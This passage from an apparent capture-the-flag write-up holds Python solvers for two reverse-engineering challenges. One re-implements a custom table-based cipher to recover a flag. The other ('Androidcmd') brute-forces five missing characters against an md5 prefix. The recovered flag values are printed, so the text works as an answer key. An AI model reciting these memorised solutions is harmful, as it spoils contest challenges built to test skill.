kbuf2 = [0x96, 0x96, 0x96, 0x7e]
kbuf3 = [0x1d, 0xeb, 0x14, 0xeb, 0xa3, 0x28, 0x15, 0x28, 0x99, 0x99, 0x99, 0xd1, 0x52, 0x96, 0x9e, 0xd6]
for i in range(16):
    kbuf3[i] ^= ord(flag_part1[i])

m82 = \
"""
0x002a  0x00e7  0x0041  0x00fc  0x0046  0x0006  0x0038  0x0001
0x00ee  0x0002  0x0079  0x0085  0x0038  0x003e  0x0090  0x00af
0x00ae  0x0041  0x00c6  0x000b  0x002a  0x00c0  0x00d7  0x006b
0x0001  0x000e  0x0099  0x00f7  0x00d4  0x002c  0x00b9  0x00ac
0x00ed  0x000b  0x00ec  0x0015  0x0061  0x00f3  0x003a  0x0069
0x009b  0x005f  0x000e  0x0011  0x0021  0x0056  0x00fc  0x009d
0x009e  0x00db  0x00b4  0x0004  0x00a8  0x00a0  0x0046  0x009b
0x00c6  0x00ac  0x0019  0x00d1  0x0042  0x006f  0x0094  0x00d3
0x005e  0x00d5  0x0026  0x009b  0x008f  0x001e  0x0069  0x00a8
0x0049  0x0094  0x0000  0x004c  0x0020  0x006d  0x000d  0x001b
0x007a  0x0073  0x00ed  0x0001  0x003d  0x0038  0x009a  0x00f3
0x00f1  0x0058  0x00af  0x0055  0x00fd  0x003c  0x00b9  0x00e2
0x00bd  0x00cb  0x00b6  0x0050  0x0089  0x0099  0x00e6  0x007b
0x00d4  0x0059  0x0078  0x00dc  0x00e0  0x006e  0x00ef  0x002e
0x00c3  0x00d5  0x006a  0x009f  0x003d  0x00a3  0x0030  0x00a0
0x002c  0x0044  0x0023  0x006e  0x00dd  0x00fd  0x003b  0x0025
0x00a0  0x0060  0x0021  0x00c8  0x00d6  0x006d  0x0009  0x00ae
0x00bc  0x00fd  0x007f  0x008c  0x00eb  0x0013  0x0010  0x00fe
0x004d  0x00b0  0x0074  0x0088  0x004e  0x00f9  0x0053  0x0075
0x00a6  0x0001  0x00e5  0x0001  0x0015  0x00cd  0x00d7  0x0097
0x00b4  0x008a  0x000f  0x00c7  0x0033  0x0030  0x00d5  0x0023
0x00cc  0x00d9  0x0048  0x009a  0x0070  0x0001  0x00ef  0x0058
0x0015  0x0017  0x008c  0x0054  0x0089  0x0041  0x0030  0x004b
0x00b6  0x0067  0x00d2  0x00be  0x0004  0x002d  0x0042  0x001c
0x00cf  0x00a9  0x01ab  0x0013  0x0016  0x00c1  0x0026  0x0069
0x00fb  0x009c  0x0049  0x006e  0x0029  0x0045  0x003c  0x00b0
0x003e  0x00bc  0x00f1  0x0007  0x0066  0x00e2  0x0032  0x00a2
0x0011  0x00df  0x00b5  0x01d6  0x002f  0x00a7  0x00c8  0x00ee
0x002d  0x000b  0x0098  0x0078  0x001f  0x0098  0x0022  0x0072
0x00f4  0x0048  0x00a1  0x0000  0x004f  0x00f7  0x007b  0x0099
0x00ef  0x0085  0x0058  0x0017  0x00d9  0x0067  0x00a2  0x0002
0x00c8  0x003c  0x00f0  0x008c  0x009c  0x00ad  0x00e9  0x0002
"""

m114 = \
"""
0x0014  0x0095  0x001a  0x00bb  0x008c  0x00e6  0x0038  0x0032
0x00ea  0x00d3  0x002d  0x001d  0x0031  0x0087  0x00fd  0x0064
0x00d5  0x005a  0x003f  0x0039  0x0085  0x005d  0x00bd  0x00ce
0x00b9  0x0023  0x0065  0x00ea  0x00dc  0x007f  0x00ba  0x003c
0x00a0  0x0045  0x0068  0x008c  0x0085  0x003d  0x00e3  0x00f8
0x0046  0x00e9  0x008b  0x0059  0x00aa  0x007f  0x0092  0x0031
0x0053  0x001a  0x004c  0x001a  0x00db  0x00e3  0x002f  0x005d
0x0073  0x0011  0x00e4  0x00e8  0x0021  0x004f  0x0040  0x00eb
0x0028  0x00a8  0x0094  0x003c  0x0040  0x00f3  0x003e  0x006d
0x00ba  0x00b8  0x00bb  0x0058  0x0001  0x006b  0x0058  0x0080
0x0099  0x009c  0x00b3  0x0030  0x0072  0x0047  0x00c0  0x0057
0x00fc  0x00da  0x00fe  0x001c  0x00a2  0x0086  0x00e1  0x00fe
0x00f7  0x00dd  0x0063  0x0047  0x0021  0x000b  0x00c2  0x0064
0x0058  0x00a6  0x00a0  0x0072  0x00ce  0x006f  0x003c  0x0083
0x00f8  0x009e  0x00b0  0x00d9  0x00d6  0x006a  0x00ee  0x003a
0x00a3  0x00c3  0x00f4  0x0054  0x005d  0x0092  0x0014  0x00ed
0x0011  0x00d4  0x0016  0x003f  0x00dc  0x004f  0x001a  0x0086
0x00c0  0x0031  0x0043  0x0005  0x002c  0x00d0  0x0086  0x00a8
0x004a  0x000f  0x000a  0x0078  0x0045  0x00d2  0x00c4  0x0027
0x0093  0x0040  0x009c  0x0060  0x00b3  0x0081  0x00c7  0x0069
0x0008  0x00ac  0x009a  0x004f  0x00b9  0x0080  0x0076  0x00d8
0x000c  0x00c1  0x00dc  0x0068  0x0091  0x00e4  0x0006  0x0005
0x00c5  0x00cb  0x009d  0x0032  0x00ed  0x001d  0x00dc  0x0012
0x00f4  0x0012  0x00c0  0x004b  0x0070  0x00b1  0x00e8  0x003f
0x00c1  0x002f  0x0100  0x00ad  0x003c  0x00c3  0x00c1  0x000e
0x001d  0x00d8  0x00eb  0x0002  0x00eb  0x00d6  0x00a3  0x0041
0x00c8  0x0046  0x00c7  0x00d5  0x0036  0x008a  0x00ac  0x00c0
0x0060  0x00ca  0x0088  0x0100  0x006f  0x0063  0x002a  0x00e1
0x00a3  0x0088  0x00ef  0x0013  0x003a  0x009d  0x001d  0x007e
0x00c4  0x00a2  0x00d1  0x00b7  0x00ee  0x001f  0x00d2  0x00fc
0x0062  0x00a2  0x0042  0x00cc  0x0058  0x00d4  0x0002  0x00f6
0x008d  0x0046  0x00e9  0x0053  0x0072  0x00d5  0x00dd  0x0062
"""

m146 = \
"""
0x00b6  0x00f8  0x0025  0x00b2  0x00d6  0x001c  0x00f9  0x00f3
0x0051  0x00a9  0x001c  0x0073  0x0040  0x004e  0x0037  0x000d
0x0099  0x00f3  0x0038  0x00dd  0x0039  0x0047  0x00f9  0x00c6
0x00b9  0x0052  0x00d8  0x00ef  0x0088  0x004e  0x0000  0x001a
0x008f  0x00b5  0x00e9  0x002e  0x002e  0x002c  0x00b2  0x005d
0x0020  0x0091  0x0059  0x0040  0x003a  0x00e6  0x0030  0x0090
0x00f4  0x000c  0x0083  0x006d  0x00f6  0x00ef  0x0015  0x00f0
0x00fe  0x0018  0x00fc  0x00cb  0x0027  0x00ae  0x0054  0x00a7
0x0007  0x0017  0x0029  0x00c0  0x00be  0x00c4  0x0079  0x0003
0x0035  0x0088  0x005c  0x0063  0x008d  0x00b6  0x0030  0x00a8
0x00e0  0x002e  0x001c  0x00bc  0x004a  0x00a6  0x0043  0x008b
0x0087  0x009c  0x00e5  0x008e  0x0078  0x0025  0x00b1  0x00be
0x00df  0x00ca  0x00a6  0x0097  0x00c7  0x007a  0x0056  0x00bb
0x0093  0x0067  0x000e  0x008e  0x00b8  0x009d  0x0049  0x00b0
0x0064  0x009c  0x00b7  0x0016  0x00ea  0x007f  0x002f  0x0018
0x0000  0x00ff  0x00be  0x009e  0x00e9  0x001e  0x0065  0x0039
0x00b1  0x0051  0x000b  0x00db  0x00dd  0x0070  0x0056  0x0012
0x0010  0x000a  0x000d  0x00bd  0x002c  0x0079  0x0065  0x0072
0x0055  0x003a  0x00f4  0x0074  0x00c2  0x0068  0x0094  0x0062
0x00a6  0x00b2  0x00f8  0x0041  0x0037  0x0018  0x0092  0x00f5
0x00a1  0x00ed  0x00ab  0x004a  0x0082  0x004c  0x00d0  0x00b2
0x00d2  0x006d  0x006a  0x004f  0x00cb  0x0007  0x00d8  0x000b
0x00a5  0x0071  0x00e1  0x00fe  0x0034  0x005c  0x00f7  0x0093
0x0055  0x0037  0x0011  0x009e  0x008e  0x00eb  0x00d9  0x0031
0x00b1  0x0039  0x002a  0x007f  0x0082  0x00bc  0x009d  0x0008
0x00c4  0x0037  0x0006  0x00b0  0x000e  0x0062  0x0057  0x00b4
0x00ea  0x00c9  0x00bf  0x00d1  0x0000  0x0064  0x00fd  0x0067
0x0085  0x00ba  0x00ad  0x0064  0x00ae  0x004d  0x0085  0x000c
0x0040  0x00b5  0x00a9  0x00f5  0x0016  0x00b3  0x0002  0x0059
0x0022  0x00d3  0x00d0  0x0058  0x0035  0x008d  0x0036  0x00ea
0x00ee  0x004b  0x002d  0x001a  0x0009  0x0014  0x006c  0x006e
0x0097  0x00c3  0x0074  0x00cf  0x0063  0x00d4  0x00fa  0x00c1
"""

m178 = \
"""
0x00e3  0x003a  0x0046  0x00c3  0x00ed  0x00d4  0x00be  0x0075
0x00ce  0x0095  0x00c6  0x0028  0x0069  0x00e4  0x00ca  0x007a
0x0015  0x0036  0x00ac  0x00d1  0x009f  0x005d  0x00ea  0x00c6
0x005a  0x00fa  0x00ce  0x009d  0x00c8  0x00b7  0x00f8  0x0058
0x00cb  0x0093  0x0081  0x00b8  0x00af  0x00f5  0x00f7  0x0063
0x0030  0x00e7  0x009f  0x00e7  0x00b1  0x00df  0x0073  0x0071
0x00ce  0x00b9  0x00d5  0x0047  0x0036  0x0082  0x00a6  0x00f5
0x00dc  0x007e  0x0043  0x0017  0x002c  0x0054  0x0036  0x00ef
0x00da  0x0037  0x0038  0x00c6  0x0088  0x000d  0x00b8  0x00cc
0x00c3  0x00af  0x000e  0x00d8  0x00e4  0x0043  0x00e4  0x002f
0x009f  0x00aa  0x0050  0x006e  0x00d6  0x00f1  0x00e7  0x0037
0x00c8  0x0006  0x003a  0x0070  0x00ae  0x00a8  0x00cb  0x0055
0x00f4  0x0099  0x007e  0x00cb  0x0066  0x006e  0x0041  0x0040
0x00b0  0x00b2  0x0073  0x00be  0x00df  0x00ee  0x0041  0x00b9
0x008a  0x002b  0x00c7  0x0029  0x008b  0x00cd  0x0036  0x0096
0x004e  0x001a  0x00f5  0x000d  0x0066  0x0043  0x00be  0x0090
0x001c  0x00a0  0x00a5  0x00f5  0x0016  0x007d  0x00aa  0x00e6
0x003d  0x004c  0x0063  0x00a0  0x00bb  0x0091  0x00b4  0x009b
0x0018  0x000d  0x0051  0x0001  0x009c  0x00eb  0x000a  0x00c9
0x0024  0x002f  0x0041  0x005d  0x00d7  0x00d5  0x00db  0x007c
0x00a0  0x005b  0x0016  0x0012  0x00a6  0x00ee  0x008f  0x008a
0x00aa  0x00f4  0x007f  0x00df  0x009b  0x00bf  0x004d  0x00ef
0x0075  0x00e0  0x0026  0x0030  0x00d9  0x0053  0x0043  0x00fc
0x00f5  0x00fb  0x00e1  0x009c  0x00c4  0x0092  0x001a  0x00ef
0x0012  0x00d6  0x00c0  0x002e  0x0064  0x00d7  0x0085  0x00e4
0x00df  0x001b  0x0086  0x0047  0x007a  0x0085  0x00a8  0x0095
0x00b0  0x00a3  0x00eb  0x00cf  0x0041  0x0055  0x006f  0x0052
0x0041  0x0089  0x00aa  0x006e  0x0014  0x0033  0x008b  0x0038
0x00c8  0x0004  0x0031  0x0089  0x00e5  0x008e  0x0062  0x0035
0x0059  0x0019  0x0003  0x0047  0x0007  0x00e8  0x0032  0x00c2
0x008a  0x00f5  0x00a8  0x0081  0x0026  0x004d  0x00e6  0x00b9
0x0027  0x00e6  0x00d8  0x0060  0x0071  0x00d7  0x0018  0x0033
"""

m82 = [int(x[2:], 16) for x in m82.split()]
m114 = [int(x[2:], 16) for x in m114.split()]
m146 = [int(x[2:], 16) for x in m146.split()]
m178 = [int(x[2:], 16) for x in m178.split()]

def rol(x, y):
    return ((x << y) & 0xffffffff) | (x >> (32-y))

def init(ax):
    ans = [0] * 82
    for i in range(4):
        ans[1+i] = kbuf2[i]
    for i in range(16):
        ans[6+i] = kbuf3[i]
        #ans[6+i+16] = kbuf3[i]
    ans[5] = 23
    for i in range(5):
        ans[77+i] = ax[i]
    for i in range(22, 38):
        ans[i] = ans[i-16]
    for i in range(4):
        ans[38+i] = ans[1+i]
    ans[42] = ans[5] << 3
    ans[42] |= 1
    for i in range(46, 51):
        ans[i] = ans[i-8]
    return ans

def hh(buf):
    h1 = [0x4D700, 0x26BC00, 0x226B00, 0x135E00, 0x178900, 0x35E200, 0x313500, 0x9AF00, 0xD7800, 0x2F1300, 0x2BC400, 0x1AF100, 0x1E2600, 0x3C4D00, 0x389A00, 0x47AC00]
    for i in range(16):
        buf[55+i] = buf[22+i] << 23
        buf[55+i] |= h1[i]
        buf[55+i] |= buf[38+i]
        if i % 2 == 0:
            buf[55+i] |= 0x400000
    for i in range(16):
        buf[55+i] &= 0x7FFFFFFF

def wtf0(buf, x1, x2, x3):
    ans = (x1 ^ buf[75]) + buf[76]
    ans &= 0xFFFFFFFF
    t1 = (buf[75] + x2) & 0xFFFFFFFF
    t2 = (buf[76] ^ x3) & 0xFFFFFFFF
    t = ((t1 & 0xFFFF) << 16) | (t2 >> 16)
    v24 = t ^ rol(t, 2) ^ rol(t, 10) ^ rol(t, 18) ^ rol(t, 24)
    t = (t1 >> 16) | ((t2 & 0xFFFF) << 16)
    v30 = t ^ rol(t, 8) ^ rol(t, 14) ^ rol(t, 22) ^ rol(t, 30)
    buf[75] = wtf3(v24) | (wtf2(v24 >> 8) << 8) | (wtf3(v24 >> 16) << 16) | (wtf2(v24 >> 24) << 24)
    buf[76] = wtf3(v30) | (wtf2(v30 >> 8) << 8) | (wtf3(v30 >> 16) << 16) | (wtf2(v30 >> 24) << 24)
    return ans


def wtf1(buf):
    buf[71] = buf[70] & 0x7FFF8000
    buf[71] <<= 1
    buf[71] |= buf[69] & 0xffff
    buf[72] = buf[66] & 0xffff
    buf[72] <<= 16
    buf[72] |= buf[64] >> 15
    buf[73] = buf[62] & 0xffff
    buf[73] <<= 16
    buf[73] |= buf[60] >> 15
    buf[74] = buf[57] & 0xffff
    buf[74] <<= 16
    buf[74] |= buf[55] >> 15

def wtf2(x):
    x &= 0xff
    return m114[x] ^ m82[x]

def wtf3(x):
    x &= 0xff
    return m178[x] ^ m146[x]

def wtf4(buf, x):
    v1 = 0x8000 * buf[70]
    v2 = 0x20000 * buf[68]
    v1 += v2
    v2 = 2**20 * buf[59]
    v1 += v2
    v2 = 2**21 * buf[65]
    v1 += v2
    v1 += buf[55]
    v2 = 0x100 * buf[55]
    v1 += v2
    v1 %= (2**31-1)
    v1 = (v1 + x) % (2**31-1)
    if v1 == 0:
        v1 = 2**31-1
    for i in range(55, 70):
        buf[i] = buf[i+1]
    buf[70] = v1

def wtf5(buf):
    v1 = 0x8000 * buf[70]
    v2 = 0x20000 * buf[68]
    v1 += v2
    v2 = 2**20 * buf[59]
    v1 += v2
    v2 = 2**21 * buf[65]
    v1 += v2
    v1 += buf[55]
    v2 = 0x100 * buf[55]
    v1 += v2
    v1 %= (2**31-1)
    if v1 == 0:
        v1 = 2**31-1
    for i in range(55, 70):
        buf[i] = buf[i+1]
    buf[70] = v1

def get_answer2(x):
    x = x[:20].ljust(20, '\x00')
    ax = [0] * 5
    for i in range(5):
        ax[i] = struct.unpack('<i', x[i*4:i*4+4].encode())[0]
    ans = []
    buf = init(ax)
    hh(buf)
    for i in range(32):
        wtf1(buf)
        t = wtf0(buf, buf[71], buf[72], buf[73])
        wtf4(buf, t>>1)
    wtf1(buf)
    v19 = wtf0(buf, buf[71], buf[72], buf[73])
    buf[77] ^= v19
    wtf5(buf)

    wtf1(buf)
    t = wtf0(buf, buf[71], buf[72], buf[73])
    t ^= buf[74]
    wtf5(buf)
    buf[77] ^= t
    ans.append(buf[77])

    wtf1(buf)
    t = wtf0(buf, buf[71], buf[72], buf[73])
    t ^= buf[74]
    wtf5(buf)
    buf[78] ^= v19
    buf[78] ^= t
    ans.append(buf[78])

    wtf1(buf)
    t = wtf0(buf, buf[71], buf[72], buf[73])
    t ^= buf[74]
    wtf5(buf)
    buf[79] ^= t
    ans.append(buf[79])

    wtf1(buf)
    t = wtf0(buf, buf[71], buf[72], buf[73])
    t ^= buf[74]
    wtf5(buf)
    buf[80] ^= t
    ans.append(buf[80])

    wtf1(buf)
    t = wtf0(buf, buf[71], buf[72], buf[73])
    t ^= buf[74]
    wtf5(buf)
    buf[81] ^= v19
    buf[81] ^= t
    ans.append(buf[81])

    return ans

def solve():
    s = ''
    ans = get_answer2('\x00' * 20)
    good_ans = [0xCF2D1915, 0x407AEF01, 0x88D0865B, 0x578F07E0, 0x4809A272]
    for i in range(5):
        v = ans[i] ^ good_ans[i]
        for j in range(4):
            s += chr((v >> (8*j)) & 0xff)
    return s

flag2 = solve()
print(flag2) # 03-be49-2afa79d24e2c

ans = get_answer2(flag2)
assert ans == [0xCF2D1915, 0x407AEF01, 0x88D0865B, 0x578F07E0, 0x4809A272]
```

### Androidcmd
The binary checks 31 characters of the input, but the flag's actual length is 36. So, we don't know the 5 missing characters. However, the binary also checks first 10 characters of `md5(flag)`. Since the input contains only hexadecimal characters and dashes, we can easily brute force the remaining 5 characters.

```python
#!/usr/bin/env python3
from itertools import product
from hashlib import md5

hash_prefix = '94bda84799d'
#flag = '82600087\x00\x00\x00\x00\x00-4524-9eaa-69646e04bf68'
start = '82600087'
end = '-4524-9eaa-69646e04bf68\n'
charset = '0123456789abcdef-'
candidates = product(charset, repeat=5)

for it in candidates:
    candidate = ''.join(it)
    flag = start + candidate + end
    md5sum = md5(flag.encode()).hexdigest()
    if md5sum.startswith(hash_prefix):
        print(f'Flag: flag{{{flag}}}')
        break
```

